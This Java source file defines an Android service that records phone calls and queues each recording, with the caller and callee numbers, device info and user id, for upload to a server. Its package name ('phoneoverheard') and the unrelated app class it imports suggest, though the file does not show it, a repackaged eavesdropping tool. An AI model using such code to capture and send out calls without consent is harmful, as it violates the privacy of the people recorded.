/*
 *  Copyright 2012 Kobi Krasnoff
 * 
 * This file is part of Call recorder For Android.

    Call recorder For Android is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    Call recorder For Android is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with Call recorder For Android.  If not, see <http://www.gnu.org/licenses/>
 */
package com.phoneoverheard.phone;

import java.io.File;
import java.io.IOException;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.media.MediaRecorder.OnErrorListener;
import android.media.MediaRecorder.OnInfoListener;
import android.os.IBinder;
import cn.linving.girls.MyApplication;

import com.phoneoverheard.bean.UploadFiles;
import com.phoneoverheard.bean.User;
import com.phoneoverheard.db.UploadFilesUnit;
import com.phoneoverheard.interfaces.Constant;
import com.phoneoverheard.interfaces.ConstantDB;
import com.phoneoverheard.util.FileUtils;
import com.phoneoverheard.util.StringUtils;
import com.phoneoverheard.util.ToastUtil;

public class RecordService extends Service {

	private MediaRecorder recorder = null;
	// 主叫
	private String callingNum = null;
	// 被叫
	private String calledNum;
	private Context context;

	private String fileFullName;
	private String fileName;
	private boolean onCall = false;
	private boolean recording = false;
	boolean exception = false;
	private UploadFilesUnit unit;
	private User user;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {
		context = this;
		unit = new UploadFilesUnit(context);
		user = MyApplication.getInstance().user;
		super.onCreate();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		if (intent != null) {
			int commandType = intent.getIntExtra("commandType", 0);

			switch (commandType) {
			case Constant.STATE_INCOMING_NUMBER:
				callingNum = intent.getStringExtra("callingNum");
				if (null != user) {
					calledNum = user.getPhoneNum();
				}
				break;
			case Constant.STATE_OUTGOING_NUMBER:
				calledNum = intent.getStringExtra("calledNum");
				if (null != user) {
					callingNum = user.getPhoneNum();
				}
				break;

			case Constant.STATE_CALL_START:
				onCall = true;

				if (onCall && !recording) {

					startRecording(intent);
				}
				break;
			case Constant.STATE_CALL_END:
				onCall = false;
				callingNum = null;
				calledNum = null;
				stopAndReleaseRecorder();
				recording = false;
				stopSelf();
				break;

			default:
				break;
			}

		}
		return super.onStartCommand(intent, flags, startId);
	}

	/**
	 * in case it is impossible to record
	 */
	private void terminateAndEraseFile() {
		stopAndReleaseRecorder();
		recording = false;
		deleteFile();
	}

	private void deleteFile() {

		FileUtils.deleteFile(new File(fileFullName));
		fileFullName = null;
		fileName = null;
	}

	private void stopAndReleaseRecorder() {
		if (recorder == null)
			return;

		boolean recorderStopped = false;

		try {
			recorder.stop();
			recorderStopped = true;

			recorder.reset();
			recorder.release();
		} catch (IllegalStateException e) {
			e.printStackTrace();
			exception = true;
		} catch (RuntimeException e) {
			exception = true;
		} catch (Exception e) {
			e.printStackTrace();
			exception = true;
		}

		recorder = null;
		if (exception) {
			deleteFile();
		} else {
			// 插入一条上传记录
			UploadFiles uploadFiles = new UploadFiles();
			uploadFiles.setFileName(fileName);
			uploadFiles.setDeviceInfo(user.getDeviceInfo());
			uploadFiles.setModule(Constant.MODULE_CALL);
			uploadFiles.setCreateTime(StringUtils.getDateTime());
			uploadFiles.setFileFullName(fileFullName);
			uploadFiles.setReceiveNum(calledNum);
			uploadFiles.setSendNum(callingNum);
			uploadFiles.setState(ConstantDB.STATE_UNUPLOAD);
			if (null != user) {
				uploadFiles.setUserId(user.getObjectId());
			}
			unit.create(uploadFiles);
		}

		if (recorderStopped) {
			ToastUtil.showToastShort(context, "stop recording");
		}
	}

	@Override
	public void onDestroy() {
		stopAndReleaseRecorder();
		stopSelf();
		super.onDestroy();
	}

	private void startRecording(Intent intent) {

		recorder = new MediaRecorder();

		try {
			recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
			recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
			recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
			fileName = StringUtils.generateFileNameByModule(context, Constant.MODULE_CALL, callingNum, calledNum);
			fileFullName = FileUtils.getUploadPath() + fileName;
			recorder.setOutputFile(fileFullName);

			OnErrorListener errorListener = new OnErrorListener() {
				public void onError(MediaRecorder arg0, int arg1, int arg2) {
					terminateAndEraseFile();
				}
			};
			recorder.setOnErrorListener(errorListener);

			OnInfoListener infoListener = new OnInfoListener() {
				public void onInfo(MediaRecorder arg0, int arg1, int arg2) {
					terminateAndEraseFile();
				}
			};
			recorder.setOnInfoListener(infoListener);

			recorder.prepare();
			// Sometimes prepare takes some time to complete
			Thread.sleep(1000);
			recorder.start();
			recording = true;
		} catch (IllegalStateException e) {
			e.printStackTrace();
			exception = true;
		} catch (IOException e) {
			e.printStackTrace();
			exception = true;
		} catch (Exception e) {
			e.printStackTrace();
			exception = true;
		}

		if (exception) {
			terminateAndEraseFile();
		}

		if (recording) {
			ToastUtil.showToastShort(context, "recording");
		} else {
			ToastUtil.showToastShort(context, "recording failed");
		}
	}

}
